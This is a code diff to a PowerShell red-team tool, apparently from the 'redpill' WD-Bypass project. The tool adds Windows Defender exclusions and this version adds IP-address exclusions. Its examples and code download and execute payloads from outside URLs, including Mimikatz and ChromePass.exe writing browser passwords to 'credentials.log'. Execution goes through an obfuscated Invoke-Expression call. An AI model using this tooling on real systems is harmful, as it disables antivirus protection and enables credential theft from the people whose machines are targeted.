@@ -7,11 +7,11 @@
    Required Dependencies: Administrator privileges
    Optional Dependencies: Iwr, Get-MpPreference, Set-MpPreference,
                           Get-MpComputerStatus, Remove-MpPreference.
-   PS cmdlet Dev version: v1.0.4
+   PS cmdlet Dev version: v1.0.5
 
 .DESCRIPTION
-   This cmdlet allow users to manage ( query, create, delete ) Windows
-   Defender exclusions: ExclusionExtension, ExclusionProcess, ExclusionPath.
+   This cmdlet allow users to manage (query,create,delete) Defender exclusions:
+   ExclusionExtension, ExclusionProcess, ExclusionPath and ExclusionIpAddress.
    The files covered by the exclusion definition will be excluded from Windows
    Defender Real-time protection, monitoring, Scheduled scans, On-demand scans.
 
@@ -33,7 +33,7 @@
    Accepts arguments: query, add, exec, del (default: query)
 
 .Parameter Type
-   ExclusionExtension, ExclusionProcess, ExclusionPath (default: ExclusionPath)
+   ExclusionExtension, ExclusionProcess, ExclusionPath, ExclusionIpAddress (default: ExclusionPath)
 
 .Parameter Exclude
    The path or PE path to exclude from defender scans (default: $Env:TMP)      
@@ -68,12 +68,20 @@
    Exclude cmd.exe process ( and associated child processes ) from windows defender scans
 
 .EXAMPLE
+   PS C:\> .\Invoke-Exclusions.ps1 -action "add" -type "ExclusionIpAddress" -Exclude "192.168.1.72"
+   Exclude '192.168.1.72' IpAddress from windows defender scans (IpAddress exclusion)
+
+.EXAMPLE
    PS C:\> .\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionProcess" -Exclude "powershell" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Mimikatz.ps1"
-   Exclude powershell process from windows defender scans (process exclusion), And Download\Execute -uri 'url' cmdlet stored to $Env:TMP directory
+   Exclude powershell process from windows defender scans (process exclusion), And Download\Execute -uri 'url' cmdlet stored in $Env:TMP directory
 
 .EXAMPLE
    PS C:\> .\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Arguments "/stext credentials.log"
    Exclude all items of %TEMP% directory from windows defender scans (path exclusion), And Download\Execute -uri 'url' binary stored in $Env:TMP with arguments
+
+.EXAMPLE
+   PS C:\> .\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionIpAddress" -Exclude "192.168.1.72" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe"
+   Exclude '192.168.1.72' IpAddress from windows defender scans (IpAddress exclusion), And Download\Execute -uri 'url' binary stored in $Env:TMP directory
 
 .EXAMPLE
    PS C:\> .\Invoke-Exclusions.ps1 -action "del" -type "ExclusionProcess" -Exclude "powershell"
@@ -95,6 +103,7 @@
    ExclusionPath      'C:\Users\pedro\AppData\Local\Temp'
    ExclusionProcess   _Empty_
    ExclusionExtension _Empty_
+   ExclusionIpAddress _Empty_
 
 .LINK
    https://github.com/r00t-3xp10it/redpill/tree/main/lib/WD-Bypass#invoke-exclusionsps1
@@ -114,7 +123,7 @@
 )
 
 
-$CmdletVersion = "v1.0.4"
+$CmdletVersion = "v1.0.5"
 #Global variable declarations
 #$ErrorActionPreference = "SilentlyContinue"
 $host.UI.RawUI.WindowTitle = "@Invoke-Exclusions $CmdletVersion {SSA@RedTeam}"
@@ -166,12 +175,14 @@ If($Action -ieq "query")
       ExclusionPath      'C:\Users\pedro\AppData\Local\Temp'
       ExclusionProcess   _Empty_
       ExclusionExtension _Empty_
+      ExclusionIpAddress _Empty_
    #>
 
    $TypeList = @(
       "ExclusionPath",
       "ExclusionProcess",
-      "ExclusionExtension"
+      "ExclusionExtension",
+      "ExclusionIpAddress"
    )
 
    #ProgressBar settings
@@ -348,19 +359,16 @@ If($Action -iMatch "(add|exec)")
       return  
    }
 
-   #CmdLet Internal Parameter incoorencies ..
-   If($Type -iMatch "^(ExclusionExtension|ExclusionProcess)$" -and $Exclude -Match '\\' -or $Exclude -Match '\.')
+   #CmdLet Internal Parameter incoorencies .. 
+   If($Type -iMatch "^(ExclusionExtension|ExclusionProcess)$" -and $Exclude -Match '\\' -and $Exclude -Match '\.')
    {
       ## Function Limmitations
       # cmdline: Set-MpPreference -ExclusionExtension "exe" -Force
       # 1 - This exclusion must NOT contain paths {C:\path\path}
       # 2 - This exclusion must NOT contain extensions wiht a dot {.exe}
-      # cmdline: Set-MpPreference -ExclusionProcess "powershell" -Force
-      # 1 - This exclusion must NOT contain paths {C:\path\path}
-      # 2 - This exclusion must NOT contain extensions with a dot {.exe}
       write-host "`n  x " -ForegroundColor Red -NoNewline
       write-host "Error: This exclusion must NOT contain: '" -ForegroundColor DarkGray -NoNewline
-      write-host "Paths OR Extensions (with a dot)" -ForegroundColor Red -NoNewline
+      write-host "Paths OR Extensions (with a dot) 444" -ForegroundColor Red -NoNewline
       write-host "'" -ForegroundColor DarkGray
 
       write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
@@ -369,7 +377,7 @@ If($Action -iMatch "(add|exec)")
       return
    }
 
-   If($Type -iMatch "ExclusionPath" -and $Exclude -NotMatch '\\' -or $Exclude -Match '\.')
+   If($Type -iMatch "ExclusionPath" -and $Exclude -NotMatch '\\' -and $Exclude -Match '\.')
    {
       ## Function Limmitations
       # cmdline: Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
@@ -384,6 +392,41 @@ If($Action -iMatch "(add|exec)")
       write-host "ok" -ForegroundColor DarkYellow -NoNewline
       write-host "].." -ForegroundColor Green
       return
+   }
+
+   #ExclusionIpAddress
+   If($Type -iMatch "ExclusionIpAddress")
+   {
+      ## Function Limmitations
+      # cmdline: Set-MpPreference -ExclusionIpAddress "192.168.1.72" -Force
+      # 1 - This exclusion must NOT contain paths {C:\path\path}
+      # 2 - This exclusion must contain 4 dots {192.168.1.72}
+
+      If($Exclude -Match '\\')
+      {
+         write-host "`n  x " -ForegroundColor Red -NoNewline
+         write-host "Error: This exclusion requires one: '" -ForegroundColor DarkGray -NoNewline
+         write-host "Ip Address" -ForegroundColor Red -NoNewline
+         write-host "'" -ForegroundColor DarkGray
+
+         write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
+         write-host "ok" -ForegroundColor DarkYellow -NoNewline
+         write-host "].." -ForegroundColor Green
+         return   
+      }
+
+      If(($Exclude.Split('.').Length) -ne 4)
+      {
+         write-host "`n  x " -ForegroundColor Red -NoNewline
+         write-host "Error: This exclusion requires one: '" -ForegroundColor DarkGray -NoNewline
+         write-host "Ip Address" -ForegroundColor Red -NoNewline
+         write-host "' (containing 4 dots)" -ForegroundColor DarkGray
+
+         write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
+         write-host "ok" -ForegroundColor DarkYellow -NoNewline
+         write-host "].." -ForegroundColor Green
+         return  
+      }
    }
 
 
@@ -469,7 +512,7 @@ If($Action -iMatch "(add|exec)")
       # Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -OutFile "$Env:TMP\ChromePass.exe"
       iwr -uri "$Uri" -OutFile "${Exclude}\${PayloadName}"|Unblock-File   
    }
-   ElseIf($Uri -ne "Off" -and $Type -iMatch "^(ExclusionProcess|ExclusionExtension)$")
+   ElseIf($Uri -ne "Off" -and $Type -iMatch "^(ExclusionProcess|ExclusionExtension|ExclusionIpAddress)$")
    {
       ## NOTES: This function mandatory downloads payloads to %TMP%
       # Extract payload name + extension from -uri
@@ -562,6 +605,27 @@ If($Action -iMatch "(add|exec)")
          $ExecMe|&('@ex' -replace '@','I')  # ChromePass.exe
          cd $StartPath                      # $pwd
       }
+      ElseIf($Uri -NotMatch "Off" -and $Type -iMatch 'ExclusionIpAddress')
+      {
+         # Type    : ExclusionIpAddress
+         # uri     : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.ps1
+         # Exclude : 192.168.1.72
+         # Set-MpPreference -ExclusionIpAddress "192.168.1.72" -Force
+
+         ## NOTES: This function mandatory downloads payloads to %TMP%
+         If($Arguments -ieq "Off" -and $PayloadName -iMatch '(exe)$')
+         {
+            $ExecMe = "Start-Process " + "$PayloadName" -Join ''         
+         }
+         Else
+         {
+            $ExecMe = ".\" + "$PayloadName" -Join ''
+         }
+
+         cd $Env:TMP                        # TMP
+         $ExecMe|&('@ex' -replace '@','I')  # ChromePass.exe
+         cd $StartPath                      # $pwd      
+      }
       ElseIf($Uri -Match "Off" -and $Type -iMatch 'ExclusionExtension')
       {
          # Type    : ExclusionExtension
@@ -616,6 +680,24 @@ If($Action -iMatch "(add|exec)")
          write-host "].." -ForegroundColor Green
          return
       }
+      ElseIf($Uri -Match "Off" -and $Type -iMatch 'ExclusionIpAddress')
+      {
+         # Type    : ExclusionIpAddress
+         # uri     : Off
+         # Exclude : 192.168.1.72
+         # Set-MpPreference -ExclusionIpAddress "192.168.1.72" -Force
+
+         ## ERROR: We can NOT execute Ip Addresses ...
+         write-host "`n  x " -ForegroundColor Red -NoNewline
+         write-host "Executing error: There is no '" -ForegroundColor DarkGray -NoNewline
+         write-host "Payload" -ForegroundColor Red -NoNewline
+         write-host "' to execute." -ForegroundColor DarkGray
+
+         write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
+         write-host "ok" -ForegroundColor DarkYellow -NoNewline
+         write-host "].." -ForegroundColor Green
+         return      
+      }
  
    }
 }
@@ -658,7 +740,7 @@ If($Action -ieq "del")
       return   
    }
 
-   If($Type -iNotMatch "^(ExclusionPath|ExclusionExtension|ExclusionProcess)$")
+   If($Type -iNotMatch "^(ExclusionPath|ExclusionExtension|ExclusionProcess|ExclusionIpAddress)$")
    {
       write-host "`n  x " -ForegroundColor Red -NoNewline
       write-host "Error: wrong '" -ForegroundColor DarkGray -NoNewline
@@ -713,7 +795,6 @@ If($Action -ieq "del")
       write-host "$Exclude" -ForegroundColor Red -NoNewline
       write-host "' exclusion(s) found .." -ForegroundColor DarkGray
    }
-
 
    <#
    .SYNOPSIS
